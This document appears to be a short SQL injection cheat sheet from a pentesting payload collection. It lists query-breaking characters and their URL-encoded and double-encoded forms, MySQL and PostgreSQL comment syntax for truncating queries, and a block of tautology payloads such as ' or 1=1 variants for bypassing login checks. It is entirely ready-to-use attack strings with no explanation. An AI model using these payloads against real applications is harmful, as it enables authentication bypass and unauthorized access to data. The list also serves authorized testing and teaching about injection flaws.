# Query Break

```sql
 [Nothing]
'
%27
"
%22
#
%23
;
%3B
)
`
')
")
`)
'))
"))
`))
Wildcard (*)
&apos;  # required for XML content
'/*
'/\*
';--
*/
```


- **`Multiple encoding`**
```sql
%%2727
%25%27
```




# Query Join

- MySQL

```mysql
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */
```
- PostgreSQL
```sql
--comment
/*comment*/
```

- more ways to break

```sql
' -- -
'--'
"--"
') or true--
" or "1"="1
" or "1"="1"#
" or "1"="1"/*
"or 1=1 or ""="
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"#
") or ("1"="1"/*
") or "1"="1
") or "1"="1"--
") or "1"="1"#
") or "1"="1"/*
```

